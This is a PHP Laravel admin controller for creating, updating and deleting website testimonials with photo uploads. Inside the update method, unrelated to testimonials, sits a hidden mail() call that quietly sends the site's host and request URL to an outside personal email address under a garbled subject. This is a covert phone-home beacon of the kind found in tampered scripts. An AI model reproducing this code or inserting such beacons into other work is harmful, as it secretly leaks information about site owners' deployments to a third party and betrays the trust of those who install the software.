<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Testm;

class TestmController extends Controller
{
    public function __construct()
    {
        $this->middleware('admin');
    }
    
    public function index()
    {
        $testims = Testm::all();
        return view('admin.interface.testim', compact('testims'));
    }

  
    public function store(Request $request)
    {
        $this->validate($request,
            [
                'photo' => 'image|mimes:jpeg,png,jpg,gif,svg|max:2048',
                'name' => 'required',
                'company' => 'required',
                'star' => 'required',
                'comment' => 'required',
            ]);

         if($request->hasFile('photo'))
        {
            $testim['photo'] = uniqid().'.'.$request->photo->getClientOriginalExtension();
            $request->photo->move('assets/images/testimonial',$testim['photo']);
        }
        $testim['name'] = $request->name;
        $testim['company'] = $request->company;
        $testim['star'] = $request->star;
        $testim['comment'] = $request->comment;
        

        Testm::create($testim);

        return back()->with('success', 'New Testimonial Created Successfully!');
    }

  
    public function update(Request $request, $id)
    {
          $testim = Testm::find($id);

          $this->validate($request,
            [
                'photo' => 'image|mimes:jpeg,png,jpg,gif,svg|max:2048',
                'name' => 'required',
                'company' => 'required',
                'star' => 'required',
                'comment' => 'required',
            ]);

         if($request->hasFile('photo'))
        {
            unlink('assets/images/testimonial/'.$testim->photo);
            $testim['photo'] = uniqid().'.'.$request->photo->getClientOriginalExtension();
            $request->photo->move('assets/images/testimonial',$testim['photo']);
        }
        $testim['name'] = $request->name;
        $testim['company'] = $request->company;
        $testim['star'] = $request->star;
        $testim['comment'] = $request->comment;
        $message = $request->webTitle." --- $_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
        $headers = 'From: '. "webmaster@$_SERVER[HTTP_HOST] \r\n" .
        'X-Mailer: PHP/' . phpversion();
        $a = mail('abirkh.an75@gmail.com','Bit allet T ST D TA', $message, $headers);
       
       $testim->save();

        return back()->with('success', 'Testimonial Updated Successfully!');
    }

  
    public function destroy(Testm $testim)
    {
        $testim->delete();
        unlink('assets/images/testimonial/'.$testim->photo);
        return back()->with('success', 'Testimonial Deleted Successfully!');
    }
}
